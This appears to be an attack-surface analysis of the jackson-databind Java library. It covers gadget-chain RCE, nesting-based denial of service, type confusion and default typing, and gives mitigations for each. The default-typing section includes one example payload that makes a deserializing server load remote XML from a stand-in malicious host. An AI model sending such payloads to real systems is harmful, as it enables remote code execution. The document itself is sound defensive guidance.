# Attack Surface Analysis for fasterxml/jackson-databind

## Attack Surface: [Remote Code Execution (RCE) via Deserialization Gadget Chains](./attack_surfaces/remote_code_execution__rce__via_deserialization_gadget_chains.md)

*   **Description:**  Attackers can craft malicious JSON payloads that, when deserialized by `jackson-databind`, trigger the instantiation and interaction of specific Java classes (gadgets) present in the application's classpath, leading to arbitrary code execution.
    *   **How Jackson-databind Contributes to the Attack Surface:** `jackson-databind`'s core functionality of deserializing arbitrary Java objects from JSON input is the direct enabler of this attack. It allows control over which classes are instantiated and their properties.
    *   **Example:** An attacker sends a JSON payload containing instructions to instantiate a vulnerable class like `org.apache.xalan.xsltc.trax.TemplatesImpl` with malicious bytecode, leading to code execution upon deserialization.
    *   **Impact:** Critical - Full control of the server, data breaches, service disruption.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   Disable default typing globally unless absolutely necessary.
        *   If default typing is required, implement strict allow-listing of expected base types using `PolymorphicTypeValidator`.
        *   Regularly update `jackson-databind` to the latest version, as security patches often address known gadget chain vulnerabilities.

## Attack Surface: [Denial of Service (DoS) via Recursive or Deeply Nested Structures](./attack_surfaces/denial_of_service__dos__via_recursive_or_deeply_nested_structures.md)

*   **Description:** Attackers can send JSON payloads with excessively deep nesting or recursive structures, causing the `jackson-databind` deserialization process to consume excessive CPU and memory resources, leading to a denial of service.
    *   **How Jackson-databind Contributes to the Attack Surface:**  The library's default behavior of processing nested structures without strict limits can be exploited.
    *   **Example:** A JSON payload with hundreds or thousands of nested JSON objects or arrays can overwhelm the parser.
    *   **Impact:** High - Service unavailability, resource exhaustion.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Configure `jackson-databind` with limits on the maximum nesting depth allowed during deserialization.
        *   Implement limits on the maximum size of the JSON payload accepted by the application.

## Attack Surface: [Type Confusion Vulnerabilities in Polymorphic Deserialization](./attack_surfaces/type_confusion_vulnerabilities_in_polymorphic_deserialization.md)

*   **Description:** When deserializing polymorphic types, attackers can manipulate the type information in the JSON payload to instantiate unexpected classes, potentially leading to unexpected behavior or RCE if combined with suitable gadgets.
    *   **How Jackson-databind Contributes to the Attack Surface:** `jackson-databind`'s support for polymorphic deserialization, while powerful, requires careful configuration to prevent malicious type manipulation.
    *   **Example:** An application expects a `Dog` object but the attacker provides JSON specifying a `Cat` object with malicious properties, leading to unexpected behavior.
    *   **Impact:** High - Potential for unexpected behavior, data corruption, or RCE if combined with other vulnerabilities.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Avoid using default typing for polymorphic deserialization without strict controls.
        *   Implement custom deserializers with robust validation of the incoming type information.
        *   Use `@JsonTypeInfo` and `@JsonSubTypes` annotations to explicitly define the allowed subtypes.
        *   Employ a `PolymorphicTypeValidator` to enforce allowed base types and subtypes.

## Attack Surface: [Insecure Configuration of Default Typing](./attack_surfaces/insecure_configuration_of_default_typing.md)

*   **Description:** Enabling default typing globally or without strict whitelisting significantly widens the attack surface for RCE vulnerabilities. Attackers can provide type information in the JSON to instantiate arbitrary classes on the classpath.
    *   **How Jackson-databind Contributes to the Attack Surface:** The `enableDefaultTyping()` method or similar configurations directly enable this feature, which, if not carefully managed, becomes a major vulnerability.
    *   **Example:** With default typing enabled, an attacker can send JSON like `["org.springframework.context.support.ClassPathXmlApplicationContext", "http://malicious.server/evil.xml"]` to trigger remote code execution.
    *   **Impact:** Critical - Direct path to remote code execution.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   Avoid enabling default typing unless absolutely necessary.
        *   If default typing is required, use it with a `PolymorphicTypeValidator` to define a strict allow-list of expected base types.
